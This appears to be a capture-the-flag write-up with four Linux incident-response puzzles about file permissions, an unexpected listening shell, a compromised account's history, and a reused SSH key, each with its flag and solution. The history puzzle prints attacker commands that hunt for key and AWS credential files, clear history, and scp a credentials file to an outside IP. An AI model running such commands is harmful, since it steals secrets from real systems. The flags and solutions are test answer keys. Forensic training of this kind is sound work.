
## Permission Denied

A directory listing from an Odapeeka State Linux box, ls -la /opt/app/:

drwxr-xr-x  4 root root  4096 Sep 10 02:11 .

drwxr-xr-x 19 root root  4096 Aug 02 14:20 ..

-rw-r--r--  1 root root  1840 Sep 10 02:11 app.conf

-rwxr-xr-x  1 root root  9216 Aug 02 14:20 app.py

-rwxrwxrwx  1 root root  3072 Sep 10 02:11 backup.sh

-rw-------  1 root root   512 Aug 02 14:20 secrets.env

drwxr-xr-x  2 root root  4096 Aug 02 14:20 logs

backup.sh runs as root, on a schedule, out of cron. One file's permissions are catastrophically wrong - any user on the box can rewrite what root is about to run.

Which file, and what's the octal?

Flag format: C6S{octal} (three digits).

**Solution:**\
We see that 777 was given to backup.sh file. This access is way too permissive.

Each section of the perm set has 3 values. We can split the perm set for backup.sh into:  
==-rwx | rwx | rwx.==\
The three groups of 3 values divided above belong to: owner | group | everyone

(r) read = 4\
(w) write = 2\
(e) execute = 1\
4 + 2 + 1 = 7

Because rwx is the same in each section, the octal value on backup.sh would give read, write and execute to everyone.

For more see:\
https://www.redhat.com/en/blog/linux-file-permissions-explained
  
## What’s Listening

ss -tlnp output from an Odapeeka State host that's supposed to run exactly four services:

State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process

LISTEN  0       128     0.0.0.0:22           0.0.0.0:*   users:(("sshd",pid=812,fd=3))

LISTEN  0       128     0.0.0.0:80           0.0.0.0:*   users:(("nginx",pid=1190,fd=6))

LISTEN  0       128     0.0.0.0:443          0.0.0.0:*   users:(("nginx",pid=1190,fd=8))

LISTEN  0       244     127.0.0.1:5432       0.0.0.0:*   users:(("postgres",pid=970,fd=5))

LISTEN  0       128     0.0.0.0:4444         0.0.0.0:*   users:(("sh",pid=30221,fd=4))

It's running five. Which port shouldn't be there?

Flag format: C6S{port_number}.

**Solution:**.\
I recognized the other ports and they match the processes/apps that are running on them. sh on 4444 is odd and should not be there. It is known in the security space as the default listener port for the Metasploit Framework and is considered a strong IoC (Indicator of Compromise).

## History Lesson

A shell history file, recovered from svalenti's account after it was flagged for compromise:

whoami

id

sudo -l

ls -la /home

cat /etc/passwd

find / -iname "*.pem" 2>/dev/**null**

find / -iname "*credentials*" 2>/dev/**null**

cat /home/dcole/.aws/credentials

history -c

scp /home/dcole/.aws/credentials 203.0.113.77:/tmp/

Reconstruct what they were actually after - not the recon, the thing they left with.

Flag format: C6S{the_specific_file_lowercase_underscores} (name the specific resource, not the general category).

**Solution:**\
The attacker used whoami to confirm that they had enough access to then search for files that are associated with aws via the find command. He found dcole’s credentials file and copied it to his machine. Clearing history didn't really mask anything.

## Keys to the Kingdom

Two systems. Two keys. One administrator who was in a hurry.

authorized_keys, fingerprinted with ssh-keygen -lf on each box:

**odapeeka-jump (10.20.30.90):**

2048 SHA256:k9K3n6qP1nF7wQeWvY0m2sE8pJ3XG4vT7YbHqzR1Uac svalenti@laptop (RSA)

2048 SHA256:8bVn1YtM3wLpQ6rXsE0aK9jH2fD5cN7gU4iOzW3Tqhc panand@desktop-panand (RSA)

**odapeeka-db01 (10.20.30.95, production database - should have nothing to do with the jump box):**

2048 SHA256:k9K3n6qP1nF7wQeWvY0m2sE8pJ3XG4vT7YbHqzR1Uac svalenti@laptop (RSA)

2048 SHA256:3mQ8pR2vN6tL4wXaJ0cH7yG9dF1sB5eK3iUoZ8Yrqhc dbadmin@db01-local (RSA)

One key pair shows up on both boxes. If that machine is ever compromised, so is production.

Whose key is it? Flag format: C6S{key_comment_lowercase_underscores} (the reused key's comment, exactly as shown - the @ becomes an underscore too).

**Solution:**\
The sha that is found on both boxes does belong to a single user. The username@label is the flag.